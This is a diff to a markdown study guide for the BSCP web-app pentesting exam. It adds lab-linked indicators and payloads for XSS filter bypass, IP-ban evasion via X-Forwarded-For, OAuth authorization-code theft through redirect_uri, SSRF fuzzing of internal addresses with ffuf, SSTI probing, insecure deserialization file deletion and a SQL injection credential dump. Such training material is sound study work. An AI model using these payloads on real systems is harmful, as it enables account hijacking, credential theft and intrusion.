@@ -1,6 +1,10 @@
 # Methodology for BSCP Web App Pentesting Without Pro
 For those who can't afford burp pro or cheapskates thogh you can't take an actual exam without pro. Note that this NOT a general pentesting methodology. For example in this workflow SQLi only appears in the stage 2 `get admin` but in reality it of course can be used for getting a normal user account.
 
+## Index
+
+---
+
 ## Flow
 
 *Indicators* provide hints on how to **identify** vulnerabilities.
@@ -111,7 +115,7 @@ replace()
 innerHTML
 addEventListener()
 ```
-
+---
 
 ### Access any user account
 
@@ -164,6 +168,23 @@ angular_VER.js
 ```js
 {{constructor.constructor('console.log(window.origin)')()}}
 ```
+
+##### WebSocket
+
+Indicators:
+Live systems (e.g. live chat)  
+`Upgrade: websocket` header  
+`Sec-Websocket-Version`  header
+`Sec-Websocket-Key` header  
+
+Bypass technique:
+```js
+<sCrIpt>alert(window.origin)</ScRipt>
+```
+
+You can spoof your IP with `X-Forwarded-For` header and bypass the ban.
+
+[Lab: Manipulating the WebSocket handshake to exploit vulnerabilities](https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities)
 
 #### Cache poisoning
 
@@ -250,6 +271,8 @@ Use Pitchfork attack in Intruder.
 
 [Lab: Broken brute-force protection, IP block](https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block)
 
+---
+
 ### Get admin
 
 #### CSRF
@@ -269,7 +292,7 @@ Working payload for this lab:
 <script>document.forms[0].submit();</script>
 ```
 
-##### Attaching social media profile
+##### Attaching social media profile (OAuth)
 
 Indicator:
 The website has `attach a social media profile` feature and has implemented OAuth.  
@@ -319,6 +342,27 @@ document.location="http://stock.ID.web-security-academy.net/?productId=1<script>
 #### Change password
 
 #### Broken access control
+
+##### Missing Function-Level Access Control in Multi-step Process
+
+The admin panel UI restricts access, but the backend doesn't verify privileges before executing the action.
+
+[Lab: Multi-step process with no access control on one step](https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step)
+
+#### OAuth
+
+Indicators:  
+Lack of `state` parameter in a request to `/auth` that initiates an OAuth flow.  
+
+##### Steal authorization code via redirect_uri
+
+This GET request `/auth?client_id=zy4g0bz0ue0ljgdsusgzm&redirect_uri=https://ID.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email` lacks the `state` parameter. Also you can see the `response_type=code` indicates the grant type is Authorization Code.
+
+You can change the redirect url to the exploit server and get the code in Access Log.
+
+[Lab: OAuth account hijacking via redirect_uri](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)
+
+---
 
 ### Read secret files
 
@@ -391,11 +435,69 @@ working payload:
 
 #### SSRF
 
+Indicators:
+Parameters containing full URLs.  
+Parameters containing partial URLs but value submitted is then incorporated server-side into a full URL.  
+Referer header visited by analytics software  
 
+##### Filter bypass via open redirection
+
+Indicators:  
+`path` parameter contains a partial url: `path=/product?productId=2`  
+
+Feed the `stockApi` parameter with `/product/nextProduct?path=http://192.168.0.12:8080/admin` in this specific lab. 
+
+[Lab: SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)
+
+In a real environment this kind of local IP address wouldn't be supplied so you need to fuzz. Use either burp Intruder of ffuf and change the value of the last octet and the port in for example `http://192.168.0.1:8080/admin`. Also you should try `http://localhost`.
+
+POST request example:
+```bash
+ffuf -w <(seq 1 10000):FUZZ1 -w <(seq 1 255):FUZZ2  -u "http://target.com" -X POST -d "Api=http://192.168.0.FUZZ1:FUZZ2" -c -s
+```
 
 #### SSTI
 
+Test:
+```
+${{<%[%'"}}%\.
+```
+
+Template identification chart by HTB:
+![SSTI identification chart](https://academy.hackthebox.com/storage/modules/145/ssti/diagram.png)
+
+##### Unknown language with a documented exploit
+
+Putting `${{<%[%'"}}%\.` into `message` parameter shows an error indicating the use of `handlebars`. Search for the [exploit](https://gist.github.com/vandaimer/b92cdda62cf731c0ca0b05a5acf719b2) using a search engine and modify a payload. URL encode and send it.
+
+[Lab: Server-side template injection in an unknown language with a documented exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
+
 #### Insecure deserialization
+
+| Object Type     | Header (Hex) | Header (Base64) |
+|-----------------|--------------|-----------------|
+| Java Serialized | AC ED        | rO              |
+| .NET ViewState  | FF 01        | /w              |
+| Python Pickle   | 80 04 95     | gASV            |
+| PHP Serialized  | 4F 3A        | Tz              |
+| Ruby Marshale4.8| 04 08        | BAg=            |
+
+
+PHP serialized format:
+```php
+O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
+```
+
+Java uses binary serialization formats. Look for `readObject()` which is used to deserialize data from `InputStream`.
+
+##### Serialization based session mechanism
+
+Indicators:  
+base64 encoded session cookie  
+
+An account delete feature specifies the path in a serialized format: `s:19:"users/wiener/avatar";`. Change this to `s:23:"/home/carlos/morale.txt";`. Changing the length (size) is important here.
+
+[PortSwigger Lab: Using application functionality to exploit insecure deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization)
 
 ## Common Payloads and Commands
 
@@ -438,6 +540,14 @@ Get credentials:
 ```sql
 1 UNION select username || ':' || password from users-- -
 ```
+
+---
+
+## Tools
+
+### SQLMap
+
+
 
 ## References
 [PortSwigger Academy Labs](https://portswigger.net/web-security/all-labs)  
